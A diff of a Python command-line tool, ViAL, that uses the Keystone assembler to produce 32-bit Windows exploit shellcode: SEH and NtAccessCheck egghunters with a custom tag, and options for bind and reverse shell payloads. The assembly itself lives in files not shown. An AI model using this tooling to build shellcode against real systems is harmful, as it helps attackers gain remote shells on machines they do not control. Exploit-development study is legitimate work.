@@ -1,104 +1,96 @@
 #!/usr/bin/python
-from argparse import ArgumentParser
-from colorama import Fore, Back, Style
-from enum import Enum
+
+import argparse
+import sys
 from keystone import *
-import ctypes, struct, sys
+from rich.console import Console
+from lib.core import Payload
 
-# ViAL - m0rtal
+console = Console()
 
-__bn  ='''
+BANNER = '''[green1]
 Y88b      / 888      e      888     
  Y88b    /  888     d8b     888     ViAL ---
   Y88b  /   888    /Y88b    888     venomous injected assembly library
    Y888/    888   /  Y88b   888     
-    Y8/     888  /____Y88b  888      
+    Y8/     888  /____Y88b  888     
      Y      888 /      Y88b 888____
-'''
+[/green1]'''
 
-__GLOBAL_QMODE = False
-
-Egg = Enum('Egg', ['IsBadReadPtr', 'NtAccessCheck', 'NtDisplayString', 'SEH'])
-Payload = Enum('Payload', ['Bind Download Execute Reverse'])
-
-def display_banner():
-    print(highlight(Fore.GREEN, __bn))
-
-def err_die(err):
-    print("%s %s" % (highlight(Fore.RED, '[ERROR]'), err))
-
-def highlight(color, text):
-    return color + text + Style.RESET_ALL
-
-def print_encoded_ip(ip_addr):
-    li = ["{:>02}".format(hex(int(i)).split('x')[1]) for i in ip_addr.split('.')]
-    li.reverse()
-
-    print("\n🧪 Encoding IPv4 address: %s" % ip_addr)
-    print("🧪 Result: 0x%s" % ''.join(li))
-
-def print_encoded_port(port_no):
-    port_dec = "{:>04}".format(hex(int(port_no)).split('x')[1])
-    port_hex = [port_dec[i:i+2] for i in range(0, len(port_dec), 2)]
-    port_hex.reverse()
-
-    print("\n🧪 Encoding port: %s" % port_no)
-    print("🧪 Result: 0x%s" % ''.join(port_hex))
-
-def resolve_symbol(dll, symbol):
-    kernel32 = ctypes.windll.kernel32
-    handle = kernel32.GetModuleHandleA(dll.encode(encoding='ascii'))
-    addr = kernel32.GetProcAddress(handle, symbol.encode(encoding='ascii'))
-    print("🧪 Result:" % hex(addr))
-    
-def generate_egghunter(egghunter):
-    if egghunter.lower() == Egg.IsBadReadPtr.name.lower():
-        eh_type = 'isBadReadPtr'
-    elif egghunter.lower() == Egg.NtAccessCheck.name.lower():
-        eh_type = 'NtAccessCheck'
-    elif egghunter.lower() == Egg.NtDisplayString.name.lower():
-        eh_type = 'NtDisplayString'
-    elif egghunter.lower() == Egg.SEH.name.lower():
-        eh_type = 'SEH'
-    else:
-        sys.exit(1) # This shouldn't ever happen
-    
-    print("🧪 Generating %s egghunter:" % eh_type)
-    code = ""
-    with open('vials/egghunter/%s.nasm' % egghunter.lower(), 'r') as file:
-        code = ''.join(file.readlines())
-    file.close()
+def print_shellcode(code):
     ks = Ks(KS_ARCH_X86, KS_MODE_32)
     encoding, count = ks.asm(code)
-    egghunter = ""
-    for dec in encoding:
-        egghunter += "\\x{0:02x}".format(int(dec)).rstrip("\n")
+    console.print("[INFO] Encoded %d instructions..." % count)
 
-    print("\"" + highlight(Fore.GREEN, egghunter) + "\"")
-    
+    shellcode = ""
+    for dec in encoding: 
+        shellcode += "\\x{0:02x}".format(int(dec)).rstrip("\n") 
+    console.print(f"[INFO] Generated shellcode ({len(shellcode)} bytes):"
+                  "\nbuf = (\"" + shellcode + "\")")
 
-if __name__ == '__main__':
-    argp = ArgumentParser(prog='vial')
-    argp.add_argument('--badchars', '-b', action='store', type=str)
-    argp.add_argument('--egghunter', action='store', type=str)
-    argp.add_argument('--encode-ip', '--ip', action='store', type=str)
-    argp.add_argument('--encode-port', '--p', action='store', type=str)
-    argp.add_argument('--no-warn', '--n')
-    argp.add_argument('--quiet', '--q', '-q', action='store_true', help='do not display the startup banner')
-    argp.add_argument('--resolve', '--r', action='store', help='resolve the address of a symbol for a given module')
-    args = argp.parse_args()
-
-    if not args.quiet:
-        display_banner()
+def main(args):
+    console.print(BANNER)
 
     if args.egghunter:
-        if args.egghunter.lower() in [m.lower() for m in Egg.__members__]:
-            generate_egghunter(args.egghunter)
+        tag = args.tag
+        op = args.egghunter[0]
+
+        if len(tag) != 4:
+            tag = Payload.DEFAULT_TAG
+            console.print("[yellow][WARN][/yellow] Tag must be four (4) characters!")
+            console.print(f"[INFO] Using default tag {tag}")
+
+        console.print(f"[INFO] Generating {op} egghunter with tag {Payload.tag_to_hex(tag)} ({tag})")
+
+        if (op.lower() == 'seh'):
+            tag = Payload.tag_to_hex(tag)
+            print_shellcode(Payload.generate_egghunter_seh(tag))
+        elif (op.lower() == 'ntaccess'):
+            tag = Payload.tag_to_hex(tag)
+            print_shellcode(Payload.generate_egghunter_ntaccess(tag))
         else:
-            err_die('Invalid egg hunter specified. Options: IsBadReadPtr, NtAccessCheck, NtDisplayString, SEH')
+            console.print(f"[WARN] No matching egghunter found for '{op}'!")
 
-    if args.encode_ip:
-        print_encoded_ip(args.encode_ip)
+if __name__ == '__main__':
 
-    if args.encode_port:
-        print_encoded_port(args.encode_port)
+    parser = argparse.ArgumentParser(
+        description = "creates a 32-bit Windows assembly payload"
+    )
+
+    exclusive_group = parser.add_mutually_exclusive_group()
+    exclusive_group.add_argument(
+        '--egghunter',
+        help = "generate a 32-bit Windows SEH or NtAccessCheckAndAuditAlarm egghunter",
+        action = 'store',
+        type = str,
+        nargs = 1,
+        choices = ['seh', 'ntaccess']
+    )
+    parser.add_argument(
+        '--payload',
+        help = "generate a 32-bit Windows bind or reverse shell payload",
+        action = 'store',
+        type = str,
+        nargs = 1,
+        choices = ['bind', 'reverse']
+    )
+    exclusive_group.add_argument(
+        '--list',
+        help = "list available payloads",
+        action = 'store_true',
+    )
+
+    parser.add_argument(
+        '--tag',
+        help = f"specify egghunter tag to use (default: {Payload.DEFAULT_TAG})",
+        action = 'store',
+        type = str,
+        default = Payload.DEFAULT_TAG
+    )
+
+    if len(sys.argv) > 1:
+        args = parser.parse_args()
+        main(args)
+    else:
+        parser.print_help()
+        sys.exit()
